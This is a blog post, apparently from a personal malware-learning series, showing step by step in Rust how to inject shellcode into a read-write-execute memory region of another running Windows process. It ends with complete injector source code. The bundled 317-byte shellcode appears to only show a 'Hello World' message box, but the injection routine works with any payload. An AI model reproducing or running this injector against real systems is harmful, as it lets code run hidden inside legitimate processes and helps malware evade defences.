---
title: Process Injection into RWX Memory
---

Ever wondered how to inject shellcode into an RWX memory region of a running process on Windows using rust? I hope not, but here's how you can do it anyway.

## Introduction

![maldev 101](/assets/maldev-1.png)

A technique malware authors use to execute their code in the context of another process is to inject their shellcode into an `RWX` memory region of the target process and spawn a thread impersonating that process. In this post, we will see how to do that.

`RWX` stands for Read-Write-Execute. In this scenario, we are looking for a memory region in a running process with all three permissions: Read, Write, and Execute.

The basic idea is to enumerate the running processes and find an `RWX` memory region in the target process.
When we find an `RWX` memory region, we write the shellcode into it using [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) and create a remote thread in the target process that starts executing the shellcode using [`CreateRemoteThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).

## Finding the RWX Memory Region

```rust
let mut processes = [0u32; 1024];
let mut bytes_returned = 0;

if EnumProcesses(
    processes.as_mut_ptr(),
    std::mem::size_of_val(&processes) as u32,
    &mut bytes_returned,
) == 0
{
    return Err("Failed to enumerate processes".into());
}
```

The [`EnumProcesses`](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses) function is used to enumerate the running processes. It returns an array of process IDs in the `processes` array and populates the `bytes_returned` variable with the number of bytes written to the `processes` array.

```rust
let num_processes = bytes_returned / 4; // 4 bytes per process ID (u32)

for &process_id in &processes[..num_processes as usize] {
    if process_id == 0 {
        continue;
    } // System Idle Process, skip it

    // rest of the enumeration code
}
```

We iterate over the process IDs and skip the System Idle Process (PID 0).

```rust
let h_process = OpenProcess(
    PROCESS_ALL_ACCESS,  // All possible access rights for a process object
    FALSE, // Don't inherit the handle
    process_id
);

if h_process.is_null() {
    println!("[-] Couldn't open process {}", process_id);
    continue; // Skip to the next process
}

let mut process_name = [0u16; 260];
let name_len = GetModuleBaseNameW(
    h_process,
    ptr::null_mut(),
    process_name.as_mut_ptr(),
    process_name.len() as u32,
);
let process_name = String::from_utf16_lossy(&process_name[..name_len as usize]);

println!("[+] Opened process {} (ID: {})", process_name, process_id);

let mut address: *mut winapi::ctypes::c_void = ptr::null_mut();
let mut success = false;
```

In this portion, we open the process using [`OpenProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) with`PROCESS_ALL_ACCESS` rights. `PROCESS_ALL_ACCESS` means "All possible access rights for a process object."

Then, we get the process name using [`GetModuleBaseNameW`](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasename) and print it along with the process ID just as a debug message.


````rust
loop {
    // a zeroed MEMORY_BASIC_INFORMATION struct
    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed(); 
    let result = VirtualQueryEx(
        h_process,
        address,
        &mut mbi,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
    );
    if result == 0 {
        break; // No more memory regions to query
    }
    if mbi.Protect == winapi::um::winnt::PAGE_EXECUTE_READWRITE {
        println!(
            "[+] Found PAGE_EXECUTE_READWRITE memory region at {:p}",
            mbi.BaseAddress
        );
        if mbi.RegionSize >= 317 {
            inject_shellcode_into_rwx_region(h_process, mbi.BaseAddress)?;
            success = true;
            break;
        } else {
            println!(
                "[-] Memory region too small ({} bytes), skipping",
                mbi.RegionSize
            );
        }
    }
    address = (mbi.BaseAddress as usize + mbi.RegionSize) as *mut _;
}
````

`mbi` is a [`MEMORY_BASIC_INFORMATION`](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information) struct that holds information about a memory region in the target process. Initially, the `mbi` struct is zeroed out using `std::mem::zeroed()`.

On each iteration of the loop, we query the memory region at the address `address` in the target process using [`VirtualQueryEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex).

We use [`VirtualQueryEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex) to query the memory region at the address `address` in the target process. The address is initially `null` but is updated at each query. We add the size of the memory region to the address to get the next memory region we want to query (
`address = (mbi.BaseAddress as usize + mbi.RegionSize)`).

The goal is to find an `RWX` memory region with a size of at least 317 bytes(the shellcode size - which ideally should not be hardcoded). If we find such a region, we call the `inject_shellcode_into_rwx_region` function to inject the shellcode into it.

## Shellcode Injection

```rust
fn inject_shellcode_into_rwx_region(
    handle: HANDLE,
    base_address: *mut winapi::ctypes::c_void,
) -> Result<(), Box<dyn std::error::Error>> {
    let shellcode: [u8; 317] = [
        0xfc, 0x48,
        // ....
        0x6c, 0x00,
    ];

    unsafe {
        let mut bytes_written = 0;

        WriteProcessMemory(
            handle,
            base_address,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
        );

        println!("[+] Injected shellcode into process at {:p}", base_address);

        let mut thread_id = 0;

        CreateRemoteThread(
            handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute::<
                _,
                unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32,
            >(base_address)),
            base_address,
            0,
            &mut thread_id,
        );

        println!("[+] Created remote thread");
    };

    Ok(())
}
```

This is the `inject_shellcode_into_rwx_region` function that injects the shellcode into the `RWX` memory region of the target process.
This is pretty straightforward. We define the shellcode as a byte array and write it into the target process using [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory). Then, we create a remote thread in the target process that starts executing the shellcode using [`CreateRemoteThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).


## Source Code

````rust
use std::ptr;
use winapi::shared::minwindef::FALSE;
use winapi::shared::ntdef::HANDLE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{VirtualQueryEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::psapi::{EnumProcesses, GetModuleBaseNameW};
use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, PROCESS_ALL_ACCESS};

// find the updated version at:
// https://github.com/ammarbinfaisal/me-learns-malwares/blob/master/enum-processes-with-rwx-memory/src/main.rs

fn inject_shellcode_into_rwx_region(
    handle: HANDLE,
    base_address: *mut winapi::ctypes::c_void,
) -> Result<(), Box<dyn std::error::Error>> {
    let shellcode: [u8; 317] = [
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48,
        0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48,
        0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
        0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e,
        0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48,
        0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
        0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41,
        0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24,
        0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
        0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
        0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48, 0x8d,
        0x8d, 0x25, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7,
        0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, 0x3e, 0x4c,
        0x8d, 0x85, 0x1a, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07,
        0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x65,
        0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61,
        0x67, 0x65, 0x42, 0x6f, 0x78, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c,
        0x6c, 0x00,
    ];

    unsafe {
        let mut bytes_written = 0;

        WriteProcessMemory(
            handle,
            base_address,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
        );

        println!("[+] Injected shellcode into process at {:p}", base_address);

        let mut thread_id = 0;

        CreateRemoteThread(
            handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute::<
                _,
                unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32,
            >(base_address)),
            base_address,
            0,
            &mut thread_id,
        );

        println!("[+] Created remote thread");
    };

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut processes = [0u32; 1024];
        let mut bytes_returned = 0;

        // Enumerate processes
        if EnumProcesses(
            processes.as_mut_ptr(),
            std::mem::size_of_val(&processes) as u32,
            &mut bytes_returned,
        ) == 0
        {
            return Err("Failed to enumerate processes".into());
        }

        let num_processes = bytes_returned / 4;

        for &process_id in &processes[..num_processes as usize] {
            if process_id == 0 {
                continue;
            } // System Idle Process, skip it

            let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);

            if h_process.is_null() {
                println!("[-] Couldn't open process {}", process_id);
                continue;
            }

            let mut process_name = [0u16; 260]; // MAX_PATH
            let name_len = GetModuleBaseNameW(
                h_process,
                ptr::null_mut(),
                process_name.as_mut_ptr(),
                process_name.len() as u32,
            );
            let process_name = String::from_utf16_lossy(&process_name[..name_len as usize]);

            println!("[+] Opened process {} (ID: {})", process_name, process_id);

            let mut address: *mut winapi::ctypes::c_void = ptr::null_mut();
            let mut success = false;

            loop {
                let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();

                let result = VirtualQueryEx(
                    h_process,
                    address,
                    &mut mbi,
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );

                if result == 0 {
                    break; // No more memory regions to query
                }

                if mbi.Protect == winapi::um::winnt::PAGE_EXECUTE_READWRITE {
                    println!(
                        "[+] Found PAGE_EXECUTE_READWRITE memory region at {:p}",
                        mbi.BaseAddress
                    );

                    if mbi.RegionSize >= 317 {
                        inject_shellcode_into_rwx_region(h_process, mbi.BaseAddress)?;
                        success = true;
                        break;
                    } else {
                        println!(
                            "[-] Memory region too small ({} bytes), skipping",
                            mbi.RegionSize
                        );
                    }
                }

                address = (mbi.BaseAddress as usize + mbi.RegionSize) as *mut _;
            }

            CloseHandle(h_process);

            if success {
                break;
            }
        }
    }

    Ok(())
}
````

## Further Reading

- [Enumerating RWX Protected Memory Regions for Code Injection](https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions)
- [Malware development trick 38: Hunting RWX](https://cocomelonc.github.io/malware/2024/05/01/malware-trick-38.html)
- [Taking a snapshot, viewing processes](https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
